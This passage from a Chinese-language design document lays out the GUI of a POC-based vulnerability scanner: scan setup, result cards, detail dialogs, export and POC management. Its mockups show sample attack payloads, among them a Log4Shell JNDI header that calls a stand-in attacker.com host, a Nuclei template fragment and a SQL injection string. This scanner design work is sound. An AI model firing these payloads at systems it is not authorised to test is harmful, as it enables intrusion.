│ ┌─────────────────────────────────────────────────────────────┐ │
│ │ 目标输入：                                                   │ │
│ │ ┌─────────────────────────────────────────────────────────┐ │ │
│ │ │ https://example.com                                      │ │ │
│ │ │ https://test.org                                        │ │ │
│ │ └─────────────────────────────────────────────────────────┘ │ │
│ │ [文件导入] [清空] [目标数：2]                                │ │
│ └─────────────────────────────────────────────────────────────┘ │
│                                                                 │
│ ┌─────────────────────────────────────────────────────────────┐ │
│ │ POC选择：   [☑ Nuclei] [☑ Goby] [☑ Xray] [☐ Pocsuite]     │ │
│ │ [POC管理] POC总数: 5000   已选: 4500                        │ │
│ └─────────────────────────────────────────────────────────────┘ │
│                                                                 │
│ ┌─────────────────────────────────────────────────────────────┐ │
│ │ 扫描选项：                                                   │ │
│ │ [☑ Critical] [☑ High] [☑ Medium] [☐ Low] [☐ Info]         │ │
│ │ [☐ 使用代理] [☐ 详细日志] [☑ 自动保存结果]                  │ │
│ │ 线程数：[20]  超时：[15秒]  重试：[2次]  标签过滤：[_____]  │ │
│ │ [快速扫描] [标准扫描] [深度扫描] [自定义▼]                  │ │
│ └─────────────────────────────────────────────────────────────┘ │
│                                                                 │
│ ┌─────────────────────────────────────────────────────────────┐ │
│ │ 智能选项：                                                   │ │
│ │ 扫描模式：[智能模式 ▼]                                       │ │
│ │ [☑ 指纹识别] [☑ POC去重] [☑ 响应缓存] [☑ 请求聚类]         │ │
│ └─────────────────────────────────────────────────────────────┘ │
│                                                                 │
│ ┌─────────────────────────────────────────────────────────────┐ │
│ │ 特殊模板：                                                   │ │
│ │ [☐ Headless (DOM XSS)] [☐ Code (本地执行)] [☐ Fuzz]        │ │
│ │ 输入类型：[自动检测 ▼]                                       │ │
│ └─────────────────────────────────────────────────────────────┘ │
│                                                                 │
│ ┌─────────────────────────────────────────────────────────────┐ │
│ │ [▶ 开始扫描]   [⏸ 暂停]   [⏹ 停止]   [历史记录]   [查看日志]│ │
│ │ ████████████████░░░░ 75%   已扫描: 150/200   耗时: 00:05:32 │ │
│ └─────────────────────────────────────────────────────────────┘ │
│                                                                 │
│ ┌─────────────────────────────────────────────────────────────┐ │
│ │ 扫描统计：                                                   │ │
│ │ ┌──────┬──────┬──────┬──────┬──────┐                       │ │
│ │ │🔴 严重│🟠 高危│🟡 中危│🔵 低危│⚪ 信息│                       │ │
│ │ │  5   │  12  │  28  │  45  │  10  │                       │ │
│ │ └──────┴──────┴──────┴──────┴──────┘                       │ │
│ └─────────────────────────────────────────────────────────────┘ │
│                                                                 │
│ ┌─────────────────────────────────────────────────────────────┐ │
│ │ 扫描结果：              [过滤▼] [排序▼] [导出报告▼] [全部清空]│ │
│ │ ┌─────────────────────────────────────────────────────────┐ │ │
│ │ │ 🔴 [CRITICAL] CVE-2021-44228 Apache Log4j2 RCE         │ │ │
│ │ │    目标: https://example.com                            │ │ │
│ │ │    产品: Apache Log4j 2.14.0                            │ │ │
│ │ │    时间: 2026-01-06 10:30:15    [查看详情] [重新验证]   │ │ │
│ │ │────────────────────────────────────────────────────────│ │ │
│ │ │ 🟠 [HIGH] CVE-2023-1234 SQL注入漏洞                     │ │ │
│ │ │    目标: https://test.org/api/users                     │ │ │
│ │ │    参数: id (GET)                                       │ │ │
│ │ │    时间: 2026-01-06 10:32:28    [查看详情] [重新验证]   │ │ │
│ │ │────────────────────────────────────────────────────────│ │ │
│ │ │ 🟡 [MEDIUM] 敏感信息泄露 - .git目录暴露                  │ │ │
│ │ │    目标: https://test.org/.git/config                   │ │ │
│ │ │    时间: 2026-01-06 10:33:45    [查看详情] [重新验证]   │ │ │
│ │ └─────────────────────────────────────────────────────────┘ │ │
│ │ 发现漏洞: 100  [1] [2] [3] ... [10] 每页显示: [10▼]        │ │
│ └─────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘
```

### 4.2 配置项与 UI 映射

| 配置项 | UI 控件 | fx:id | 默认值 |
|--------|---------|-------|--------|
| 扫描模式 | ComboBox | `scanModeComboBox` | 智能模式 |
| 指纹识别 | CheckBox | `enableFingerprintBox` | ✓ |
| POC 去重 | CheckBox | `enableDeduplicationBox` | ✓ |
| 响应缓存 | CheckBox | `enableResponseCacheBox` | ✓ |
| 请求聚类 | CheckBox | `enableClusteringBox` | ✓ |
| Headless | CheckBox | `enableHeadlessBox` | ✗ |
| Code | CheckBox | `enableCodeBox` | ✗ |
| Fuzz | CheckBox | `enableFuzzBox` | ✗ |
| 输入类型 | ComboBox | `inputTypeComboBox` | 自动检测 |
| POC 格式 | CheckBox[] | `nucleiCheckBox` 等 | 全选 |
| 严重程度 | CheckBox[] | `severityCriticalBox` 等 | CHMI |
| 线程数 | TextField | `threadsField` | 20 |
| 超时 | TextField | `timeoutField` | 15 |
| 重试 | TextField | `retriesField` | 2 |

### 4.3 结果展示UI详细设计

#### 4.3.1 漏洞列表展示

```
┌─────────────────────────────────────────────────────────────────┐
│ 扫描结果：              [过滤▼] [排序▼] [导出报告▼] [全部清空] │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│ ┌─ 漏洞卡片 ─────────────────────────────────────────────────┐ │
│ │ 🔴 [CRITICAL] CVE-2021-44228 Apache Log4j2 远程代码执行    │ │
│ │ ┌──────────────────────────────────────────────────────────┐│ │
│ │ │ 目标: https://example.com/api/login                      ││ │
│ │ │ 产品: Apache Log4j 2.14.0                                ││ │
│ │ │ POC: nuclei/cves/2021/CVE-2021-44228.yaml               ││ │
│ │ │ 发现时间: 2026-01-06 10:30:15                            ││ │
│ │ │ 匹配器: dsl (contains(body, 'jndi'))                    ││ │
│ │ │ 提取值: version="2.14.0", endpoint="/api/login"         ││ │
│ │ └──────────────────────────────────────────────────────────┘│ │
│ │ [查看详情] [重新验证] [标记误报] [复制PoC] [导出单个]       │ │
│ └──────────────────────────────────────────────────────────────┘ │
│                                                                  │
│ ┌─ 漏洞卡片 ─────────────────────────────────────────────────┐ │
│ │ 🟠 [HIGH] SQL注入 - /api/users?id={{payload}}             │ │
│ │ ┌──────────────────────────────────────────────────────────┐│ │
│ │ │ 目标: https://test.org/api/users?id=1                    ││ │
│ │ │ 参数: id (GET)                                           ││ │
│ │ │ Payload: 1' AND 1=1--                                    ││ │
│ │ │ 发现时间: 2026-01-06 10:32:28                            ││ │
│ │ │ 响应时间: 1250ms                                         ││ │
│ │ │ 状态码: 200                                              ││ │
│ │ └──────────────────────────────────────────────────────────┘│ │
│ │ [查看详情] [重新验证] [标记误报] [复制PoC] [导出单个]       │ │
│ └──────────────────────────────────────────────────────────────┘ │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
发现漏洞: 100  [1] [2] [3] ... [10]  每页显示: [10▼]  跳转: [___]
```

**UI控件说明：**

| 控件ID | 类型 | 功能 |
|--------|------|------|
| `resultVBox` | VBox | 漏洞列表容器 |
| `resultFilterComboBox` | ComboBox | 过滤器（全部/严重/高危/中危/低危/信息） |
| `resultSortComboBox` | ComboBox | 排序（时间/严重度/目标/POC名称） |
| `resultExportButton` | MenuButton | 导出按钮（带下拉菜单） |
| `resultClearButton` | Button | 清空所有结果 |
| `resultPagination` | Pagination | 分页控件 |
| `resultPageSizeComboBox` | ComboBox | 每页显示数量（10/20/50/100） |

#### 4.3.2 漏洞详情弹窗

```
┌─────────────────────────────────────────────────────────────────┐
│ 漏洞详情                                               [×] 关闭  │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│ ┌─ 基本信息 ────────────────────────────────────────────────┐  │
│ │ 漏洞名称: CVE-2021-44228 Apache Log4j2 RCE                │  │
│ │ 严重程度: 🔴 CRITICAL (CVSS 10.0)                         │  │
│ │ 漏洞分类: RCE (Remote Code Execution)                     │  │
│ │ CVE编号:  CVE-2021-44228                                  │  │
│ │ 发现时间: 2026-01-06 10:30:15                             │  │
│ │ POC来源:  Nuclei (nuclei/cves/2021/CVE-2021-44228.yaml)  │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ 目标信息 ────────────────────────────────────────────────┐  │
│ │ 目标URL:  https://example.com/api/login                   │  │
│ │ 请求方法: POST                                             │  │
│ │ 状态码:   200 OK                                          │  │
│ │ 响应时间: 245ms                                           │  │
│ │ Content-Type: application/json                            │  │
│ │ Server:   Apache/2.4.41 (Unix)                            │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ 请求详情 ────────────────────────────────────────────────┐  │
│ │ POST /api/login HTTP/1.1                                  │  │
│ │ Host: example.com                                         │  │
│ │ Content-Type: application/json                            │  │
│ │ X-Api-Version: ${jndi:ldap://attacker.com/a}              │  │
│ │                                                            │  │
│ │ {"username":"admin","password":"test"}                    │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ 响应详情 ────────────────────────────────────────────────┐  │
│ │ HTTP/1.1 200 OK                                           │  │
│ │ Content-Type: application/json                            │  │
│ │ Content-Length: 125                                       │  │
│ │                                                            │  │
│ │ {"status":"success","message":"Login successful"}         │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ 匹配信息 ────────────────────────────────────────────────┐  │
│ │ 匹配器类型: DSL                                            │  │
│ │ 匹配条件:   contains(body, 'success') && status_code==200 │  │
│ │ 匹配结果:   ✓ 匹配成功                                     │  │
│ │                                                            │  │
│ │ 提取器:     Regex Extractor                               │  │
│ │ 提取模式:   "version":"([^"]+)"                           │  │
│ │ 提取值:     version="2.14.0"                              │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ 漏洞描述 ────────────────────────────────────────────────┐  │
│ │ Apache Log4j2 2.0-beta9 至 2.15.0（不包括安全版本        │  │
│ │ 2.12.2、2.12.3 和 2.3.1）中存在 JNDI 注入漏洞，当配置、   │  │
│ │ 日志消息和参数不保护查找或存在漏洞的 JNDI 功能的用户输入  │  │
│ │ 时，攻击者可以控制日志消息或日志消息参数，从而执行任意代  │  │
│ │ 码...                                                      │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ 修复建议 ────────────────────────────────────────────────┐  │
│ │ 1. 立即升级 Apache Log4j2 到 2.17.1 或更高版本            │  │
│ │ 2. 如果无法升级，可设置 JVM 参数：                         │  │
│ │    -Dlog4j2.formatMsgNoLookups=true                       │  │
│ │ 3. 移除 JndiLookup 类：                                   │  │
│ │    zip -q -d log4j-core-*.jar \                           │  │
│ │      org/apache/logging/log4j/core/lookup/JndiLookup.class│  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ 参考链接 ────────────────────────────────────────────────┐  │
│ │ • CVE详情: https://cve.mitre.org/cgi-bin/cvename.cgi?... │  │
│ │ • NVD: https://nvd.nist.gov/vuln/detail/CVE-2021-44228    │  │
│ │ • Apache: https://logging.apache.org/log4j/2.x/security...│  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ [重新验证] [标记误报] [复制请求] [复制响应] [导出详情] [关闭] │
└─────────────────────────────────────────────────────────────────┘
```

**弹窗控件说明：**

| 控件ID | 类型 | 功能 |
|--------|------|------|
| `detailPopup` | Stage/Dialog | 详情弹窗主容器 |
| `detailNameLabel` | Label | 漏洞名称 |
| `detailSeverityLabel` | Label | 严重程度（带颜色标识） |
| `detailCveLabel` | Label | CVE编号 |
| `detailTargetLabel` | Label | 目标URL |
| `detailRequestArea` | TextArea | 请求详情（支持语法高亮） |
| `detailResponseArea` | TextArea | 响应详情（支持语法高亮） |
| `detailMatcherArea` | TextArea | 匹配器信息 |
| `detailDescriptionArea` | TextArea | 漏洞描述 |
| `detailReferencesVBox` | VBox | 参考链接列表 |

#### 4.3.3 结果过滤器

```
┌─────────────────────────────────────────────────────┐
│ 过滤条件                              [×] 关闭      │
├─────────────────────────────────────────────────────┤
│                                                      │
│ 严重程度：                                           │
│ [☑] Critical  [☑] High  [☑] Medium  [☐] Low  [☐] Info│
│                                                      │
│ POC格式：                                            │
│ [☑] Nuclei  [☑] Xray  [☑] Goby  [☐] Pocsuite       │
│                                                      │
│ 漏洞分类：                                           │
│ [☑] CVE  [☑] RCE  [☑] SQL注入  [☐] XSS  [☐] SSRF   │
│                                                      │
│ 目标筛选：                                           │
│ 包含URL: [_______________________________]          │
│ 排除URL: [_______________________________]          │
│                                                      │
│ 时间范围：                                           │
│ 开始时间: [2026-01-06 00:00] 结束时间: [现在]       │
│                                                      │
│ 高级筛选：                                           │
│ [☐] 仅显示已验证   [☐] 排除误报   [☐] 仅显示高危    │
│                                                      │
│         [应用筛选] [重置] [保存为预设]              │
└─────────────────────────────────────────────────────┘
```

#### 4.3.4 结果排序选项

```
排序方式：
├── 按时间排序（最新优先/最早优先）
├── 按严重度排序（严重→信息/信息→严重）
├── 按目标URL排序（A-Z/Z-A）
├── 按POC名称排序（A-Z/Z-A）
├── 按响应时间排序（快→慢/慢→快）
└── 自定义排序（多字段组合）
```

#### 4.3.5 批量操作

```
┌─────────────────────────────────────────────────────┐
│ 已选中 15 个漏洞                                     │
├─────────────────────────────────────────────────────┤
│ [全选] [反选] [清除选择]                             │
│                                                      │
│ 批量操作：                                           │
│ • [批量导出] - 导出选中的漏洞                        │
│ • [批量验证] - 重新验证选中的漏洞                    │
│ • [批量标记] - 标记为误报/已修复/待确认              │
│ • [批量删除] - 从结果列表中删除                      │
│ • [生成报告] - 生成包含选中漏洞的报告                │
└─────────────────────────────────────────────────────┘
```

### 4.4 导出功能UI详细设计

#### 4.4.1 导出配置界面

```
┌─────────────────────────────────────────────────────────────────┐
│ 导出扫描报告                                          [×] 关闭  │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│ ┌─ 导出格式 ────────────────────────────────────────────────┐  │
│ │ ◉ Word文档 (.docx)    - 适合正式报告提交                 │  │
│ │ ○ Excel表格 (.xlsx)   - 适合数据分析和筛选               │  │
│ │ ○ HTML网页 (.html)    - 适合在线查看和分享               │  │
│ │ ○ PDF文档 (.pdf)      - 适合存档和打印                   │  │
│ │ ○ JSON数据 (.json)    - 适合程序处理和导入               │  │
│ │ ○ CSV表格 (.csv)      - 适合导入其他工具                 │  │
│ │ ○ Markdown (.md)      - 适合文档编辑                     │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ 导出内容 ────────────────────────────────────────────────┐  │
│ │ [☑] 扫描概览（目标数、POC数、发现漏洞数等）              │  │
│ │ [☑] 漏洞统计图表（严重度分布、分类分布）                 │  │
│ │ [☑] 漏洞详细列表                                          │  │
│ │ [☑] 请求/响应详情                                         │  │
│ │ [☑] 修复建议                                              │  │
│ │ [☐] 原始日志                                              │  │
│ │ [☐] POC源码                                               │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ 筛选条件 ────────────────────────────────────────────────┐  │
│ │ 导出范围: ◉ 全部漏洞  ○ 当前页  ○ 选中项  ○ 自定义筛选  │  │
│ │                                                            │  │
│ │ 严重度: [☑] Critical [☑] High [☑] Medium [☐] Low [☐] Info│  │
│ │ 状态:   [☑] 已验证   [☐] 待确认   [☐] 误报               │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ 报告模板 ────────────────────────────────────────────────┐  │
│ │ 选择模板: [标准模板 ▼]                                     │  │
│ │   ├── 标准模板 - 包含所有基本信息                         │  │
│ │   ├── 简洁模板 - 仅包含漏洞列表                           │  │
│ │   ├── 详细模板 - 包含完整请求响应                         │  │
│ │   ├── 高管摘要 - 面向管理层的摘要报告                     │  │
│ │   └── 自定义模板...                                       │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ 报告信息 ────────────────────────────────────────────────┐  │
│ │ 报告标题: [___________________________________________]    │  │
│ │ 生成者:   [___________________________________________]    │  │
│ │ 组织:     [___________________________________________]    │  │
│ │ 备注:     [___________________________________________]    │  │
│ │           [___________________________________________]    │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ 保存路径 ────────────────────────────────────────────────┐  │
│ │ 保存到: [/Users/potato/Desktop/reports/]          [浏览...]    │  │
│ │ 文件名: [扫描报告_2026-01-06_103015.docx]                 │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│              [预览报告] [开始导出] [取消]                       │
└─────────────────────────────────────────────────────────────────┘
```

**导出配置控件说明：**

| 控件ID | 类型 | 功能 |
|--------|------|------|
| `exportFormatGroup` | RadioButton Group | 导出格式选择 |
| `exportContentCheckBoxes` | CheckBox[] | 导出内容选择 |
| `exportRangeGroup` | RadioButton Group | 导出范围选择 |
| `exportTemplateComboBox` | ComboBox | 报告模板选择 |
| `exportTitleField` | TextField | 报告标题 |
| `exportAuthorField` | TextField | 生成者 |
| `exportOrgField` | TextField | 组织 |
| `exportNotesArea` | TextArea | 备注信息 |
| `exportPathField` | TextField | 保存路径 |
| `exportFileNameField` | TextField | 文件名 |
| `exportPreviewButton` | Button | 预览报告 |
| `exportExecuteButton` | Button | 开始导出 |

#### 4.4.2 导出进度显示

```
┌─────────────────────────────────────────────────────┐
│ 正在导出报告...                                      │
├─────────────────────────────────────────────────────┤
│                                                      │
│ 导出格式: Word文档 (.docx)                          │
│ 漏洞数量: 100                                       │
│                                                      │
│ 当前步骤: 生成漏洞详情 (75/100)                     │
│ ████████████████░░░░ 75%                            │
│                                                      │
│ 已完成步骤:                                          │
│ ✓ 生成报告头部                                      │
│ ✓ 生成扫描概览                                      │
│ ✓ 生成统计图表                                      │
│ ⏳ 生成漏洞详情...                                  │
│ ⏸ 生成修复建议                                      │
│ ⏸ 保存文件                                          │
│                                                      │
│ 预计剩余时间: 约 15 秒                               │
│                                                      │
│                    [取消导出]                        │
└─────────────────────────────────────────────────────┘
```

#### 4.4.3 导出完成提示

```
┌─────────────────────────────────────────────────────┐
│ ✓ 报告导出成功！                                     │
├─────────────────────────────────────────────────────┤
│                                                      │
│ 文件名: 扫描报告_2026-01-06_103015.docx             │
│ 大小:   2.5 MB                                      │
│ 路径:   /Users/potato/Desktop/reports/                   │
│                                                      │
│ 包含内容:                                            │
│ • 扫描概览                                           │
│ • 100 个漏洞详情                                    │
│ • 统计图表                                           │
│ • 修复建议                                           │
│                                                      │
│ [打开文件] [打开文件夹] [再次导出] [关闭]           │
└─────────────────────────────────────────────────────┘
```

#### 4.4.4 支持的导出格式详细说明

| 格式 | 文件扩展名 | 特点 | 包含内容 |
|------|-----------|------|----------|
| **Word** | .docx | 专业报告格式，支持样式、表格、图表 | 完整报告结构，包括封面、目录、详细内容 |
| **Excel** | .xlsx | 表格化数据，支持筛选、排序、图表 | 多个工作表：概览、漏洞列表、统计数据 |
| **HTML** | .html | 网页格式，支持交互、搜索 | 单页应用，带导航、筛选、搜索功能 |
| **PDF** | .pdf | 通用格式，适合打印和存档 | 完整报告，带书签导航 |
| **JSON** | .json | 结构化数据，适合程序处理 | 完整的扫描结果数据 |
| **CSV** | .csv | 纯文本表格，兼容性好 | 漏洞列表（扁平化结构） |
| **Markdown** | .md | 纯文本文档，易于编辑 | 结构化文本报告 |

### 4.5 POC管理界面设计

#### 4.5.1 POC管理主界面

```
┌─────────────────────────────────────────────────────────────────┐
│ POC 管理                                              [×] 关闭  │
├─────────────────────────────────────────────────────────────────┤
│ [刷新] [导入POC] [导出选中] [删除选中] [在线更新]  POC总数: 5432│
│                                                                  │
│ 搜索: [____________]  格式: [全部▼]  严重度: [全部▼]  分类: [全部▼]│
│                                                                  │
│ ┌─ POC 列表 ────────────────────────────────────────────────┐  │
│ │ ☑ │ ID │ 名称 │ 格式 │ 严重度 │ 分类 │ 标签 │ 更新时间 │ 操作│  │
│ ├───┼────┼──────┼──────┼────────┼──────┼──────┼──────────┼─────┤  │
│ │☑ │001 │CVE-2021-44228│Nuclei│CRITICAL│CVE   │apache... │2024...│  │
│ │  │    │Apache Log4j2 │      │        │      │log4j     │      │  │
│ │  │    │RCE           │      │        │      │          │      │  │
│ │  │    │              │      │        │      │ [详情][编辑][删除]│  │
│ ├───┼────┼──────────────┼──────┼────────┼──────┼──────────┼─────┤  │
│ │☐ │002 │SQL注入通用   │Xray  │HIGH    │SQL   │sql       │2024...│  │
│ │  │    │检测          │      │        │      │injection │      │  │
│ │  │    │              │      │        │      │ [详情][编辑][删除]│  │
│ ├───┼────┼──────────────┼──────┼────────┼──────┼──────────┼─────┤  │
│ │☐ │003 │Tomcat信息泄露│Goby  │MEDIUM  │INFO  │tomcat    │2024...│  │
│ │  │    │              │      │        │LEAK  │          │      │  │
│ │  │    │              │      │        │      │ [详情][编辑][删除]│  │
│ └───┴────┴──────────────┴──────┴────────┴──────┴──────────┴─────┘  │
│ [全选] [反选]  已选: 1  共 543 条  [1][2][3]...[55]  每页: [10▼]│
└─────────────────────────────────────────────────────────────────┘
```

**POC管理控件说明：**

| 控件ID | 类型 | 功能 |
|--------|------|------|
| `pocTableView` | TableView | POC列表表格 |
| `pocSearchField` | TextField | POC搜索框 |
| `pocFormatFilter` | ComboBox | 格式过滤器 |
| `pocSeverityFilter` | ComboBox | 严重度过滤器 |
| `pocCategoryFilter` | ComboBox | 分类过滤器 |
| `pocRefreshButton` | Button | 刷新POC列表 |
| `pocImportButton` | Button | 导入POC |
| `pocExportButton` | Button | 导出选中POC |
| `pocDeleteButton` | Button | 删除选中POC |
| `pocUpdateButton` | Button | 在线更新POC |

#### 4.5.2 POC详情查看/编辑

```
┌─────────────────────────────────────────────────────────────────┐
│ POC 详情 - CVE-2021-44228                            [×] 关闭  │
├─────────────────────────────────────────────────────────────────┤
│ [查看模式 ▼]  [保存] [另存为] [测试POC]                         │
│                                                                  │
│ ┌─ 基本信息 ────────────────────────────────────────────────┐  │
│ │ ID:        [CVE-2021-44228__________________]              │  │
│ │ 名称:      [Apache Log4j2 远程代码执行_____]              │  │
│ │ 作者:      [ProjectDiscovery________________]              │  │
│ │ 严重度:    [Critical ▼]                                    │  │
│ │ 分类:      [CVE ▼]                                         │  │
│ │ 协议:      [HTTP ▼]                                        │  │
│ │ 标签:      [apache, log4j, rce, cve2021___]               │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ POC 内容 ────────────────────────────────────────────────┐  │
│ │ 格式: [Nuclei YAML ▼]                                      │  │
│ │ ┌──────────────────────────────────────────────────────┐  │  │
│ │ │ id: CVE-2021-44228                                    │  │  │
│ │ │                                                        │  │  │
│ │ │ info:                                                  │  │  │
│ │ │   name: Apache Log4j2 Remote Code Injection           │  │  │
│ │ │   author: pdteam                                       │  │  │
│ │ │   severity: critical                                   │  │  │
│ │ │   description: Apache Log4j2 <=2.14.1 JNDI features   │  │  │
│ │ │   ...                                                  │  │  │
│ │ │                                                        │  │  │
│ │ │ http:                                                  │  │  │
│ │ │   - method: GET                                        │  │  │
│ │ │     path:                                              │  │  │
│ │ │       - "{{BaseURL}}"                                  │  │  │
│ │ │     headers:                                           │  │  │
│ │ │       X-Api-Version: "${jndi:ldap://{{interactsh}}}"  │  │  │
│ │ │     ...                                                │  │  │
│ │ └──────────────────────────────────────────────────────┘  │  │
│ │ [格式化] [验证语法] [复制] [粘贴]                          │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ 元数据 ──────────────────────────────────────────────────┐  │
│ │ 文件路径:   nuclei/cves/2021/CVE-2021-44228.yaml          │  │
│ │ 文件大小:   1.2 KB                                         │  │
│ │ Content Hash: a1b2c3d4e5f6...                             │  │
│ │ 创建时间:   2021-12-10 15:30:00                           │  │
│ │ 更新时间:   2024-01-05 10:20:15                           │  │
│ │ 使用次数:   1,234                                          │  │
│ │ 成功次数:   56                                             │  │
│ │ 成功率:     4.5%                                           │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ 参考链接 ────────────────────────────────────────────────┐  │
│ │ • https://github.com/projectdiscovery/nuclei-templates... │  │
│ │ • https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-... │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│                     [保存] [取消]                                │
└─────────────────────────────────────────────────────────────────┘
```

#### 4.5.3 POC导入

```
┌─────────────────────────────────────────────────────┐
│ 导入 POC                               [×] 关闭      │
├─────────────────────────────────────────────────────┤
│                                                      │
│ 导入方式:                                            │
│ ◉ 从文件导入                                         │
│ ○ 从URL导入                                          │
│ ○ 从GitHub仓库导入                                   │
│ ○ 从剪贴板导入                                       │
│                                                      │
│ ┌─ 文件选择 ──────────────────────────────────────┐ │
│ │ 文件路径: [/path/to/pocs/___] [浏览...]         │ │
│ │                                                  │ │
│ │ POC格式:  [自动检测 ▼]                           │ │
│ │   ├── 自动检测（根据文件扩展名和内容）           │ │
│ │   ├── Nuclei YAML                                │ │
│ │   ├── Xray YAML                                  │ │
│ │   ├── Goby JSON                                  │ │
│ │   └── Pocsuite JSON                              │ │
│ │                                                  │ │
│ │ [☑] 递归导入子目录                               │ │
│ │ [☑] 跳过已存在的POC（基于content_hash）          │ │
│ │ [☐] 覆盖同ID的POC                                │ │
│ │ [☑] 导入后验证POC语法                            │ │
│ └──────────────────────────────────────────────────┘ │
│                                                      │
│ 预览:                                                │
│ ┌──────────────────────────────────────────────────┐ │
│ │ 发现文件: 150                                    │ │
│ │ 有效POC:  142                                    │ │
│ │ 无效POC:  8 (语法错误)                           │ │
│ │ 重复POC:  12 (将被跳过)                          │ │
│ └──────────────────────────────────────────────────┘ │
│                                                      │
│            [开始导入] [预览详情] [取消]              │
└─────────────────────────────────────────────────────┘
```

#### 4.5.4 POC在线更新

```
┌─────────────────────────────────────────────────────┐
│ POC 在线更新                           [×] 关闭      │
├─────────────────────────────────────────────────────┤
│                                                      │
│ 更新源: [官方源 (potato.gold) ▼]                    │
│   ├── 官方源 (potato.gold)                          │
│   ├── GitHub (projectdiscovery/nuclei-templates)   │
│   └── 自定义源...                                    │
│                                                      │
│ [检查更新]                                           │
│                                                      │
│ ┌─ 更新信息 ──────────────────────────────────────┐ │
│ │ 当前版本: 2025.01.05                             │ │
│ │ 最新版本: 2025.01.15                             │ │
│ │ 更新说明: 新增 CVE-2025-xxx，修复若干误报        │ │
│ │                                                  │ │
│ │ 更新内容:                                        │ │
│ │ • 新增 POC: 125 个                               │ │
│ │ • 更新 POC: 45 个                                │ │
│ │ • 删除 POC: 12 个                                │ │
│ │                                                  │ │
│ │ 下载大小: 约 2.5 MB                              │ │
│ └──────────────────────────────────────────────────┘ │
│                                                      │
│ ┌─ 更新选项 ──────────────────────────────────────┐ │
│ │ [☑] 自动备份当前POC                              │ │
│ │ [☑] 保留自定义POC                                │ │
│ │ [☐] 仅下载新增POC                                │ │
│ │ [☑] 更新后重新加载POC库                          │ │
│ └──────────────────────────────────────────────────┘ │
│                                                      │
│         [开始更新] [查看更新日志] [取消]             │
└─────────────────────────────────────────────────────┘
```

### 4.6 历史记录界面设计

#### 4.6.1 历史记录主界面

```
┌─────────────────────────────────────────────────────────────────┐
│ 扫描历史记录                                         [×] 关闭  │
├─────────────────────────────────────────────────────────────────┤
│ 时间范围: [最近7天 ▼]  状态: [全部 ▼]  [搜索]  [导出] [清理]  │
│                                                                  │
│ ┌─ 历史列表 ────────────────────────────────────────────────┐  │
│ │ ☑│扫描ID│开始时间│耗时│目标数│POC数│漏洞数│状态│ 操作      │  │
│ ├──┼──────┼────────┼────┼──────┼─────┼──────┼────┼──────────┤  │
│ │☐│scan-│2026-01-│05:32│  5   │4500 │ 100  │完成│[加载][详情]│  │
│ │  │2601 │06      │    │      │     │      │    │[导出][删除]│  │
│ │  │0610 │10:30   │    │      │     │      │    │           │  │
│ ├──┼──────┼────────┼────┼──────┼─────┼──────┼────┼──────────┤  │
│ │☐│scan-│2026-01-│12:15│  10  │4500 │ 245  │完成│[加载][详情]│  │
│ │  │2601 │05      │    │      │     │      │    │[导出][删除]│  │
│ │  │0518 │14:20   │    │      │     │      │    │           │  │
│ ├──┼──────┼────────┼────┼──────┼─────┼──────┼────┼──────────┤  │
│ │☐│scan-│2026-01-│02:45│  3   │2000 │  12  │暂停│[继续][详情]│  │
│ │  │2601 │04      │    │      │     │      │    │[导出][删除]│  │
│ │  │0409 │09:15   │    │      │     │      │    │           │  │
│ ├──┼──────┼────────┼────┼──────┼─────┼──────┼────┼──────────┤  │
│ │☐│scan-│2026-01-│00:15│  1   │ 500 │  0   │失败│[重试][详情]│  │
│ │  │2601 │03      │    │      │     │      │    │[导出][删除]│  │
│ │  │0315 │16:40   │    │      │     │      │    │           │  │
│ └──┴──────┴────────┴────┴──────┴─────┴──────┴────┴──────────┘  │
│ [全选] [反选]  已选: 0  共 45 条  [1][2][3]...[5]  每页: [10▼]│
└─────────────────────────────────────────────────────────────────┘
```

**历史记录控件说明：**

| 控件ID | 类型 | 功能 |
|--------|------|------|
| `historyTableView` | TableView | 历史记录表格 |
| `historyTimeRangeComboBox` | ComboBox | 时间范围过滤 |
| `historyStatusFilter` | ComboBox | 状态过滤器 |
| `historySearchButton` | Button | 搜索历史 |
| `historyExportButton` | Button | 导出历史 |
| `historyCleanButton` | Button | 清理历史 |
| `historyLoadButton` | Button | 加载历史结果 |
| `historyDetailButton` | Button | 查看详情 |

#### 4.6.2 历史详情查看

```
┌─────────────────────────────────────────────────────────────────┐
│ 扫描详情 - scan-20260106103015                      [×] 关闭  │
├─────────────────────────────────────────────────────────────────┤
│ [加载结果] [导出] [删除此记录]                                  │
│                                                                  │
│ ┌─ 扫描概览 ────────────────────────────────────────────────┐  │
│ │ 扫描ID:     scan-20260106103015                            │  │
│ │ 开始时间:   2026-01-06 10:30:15                           │  │
│ │ 结束时间:   2026-01-06 10:35:47                           │  │
│ │ 总耗时:     05分32秒                                       │  │
│ │ 扫描状态:   ✓ 已完成                                       │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ 扫描配置 ────────────────────────────────────────────────┐  │
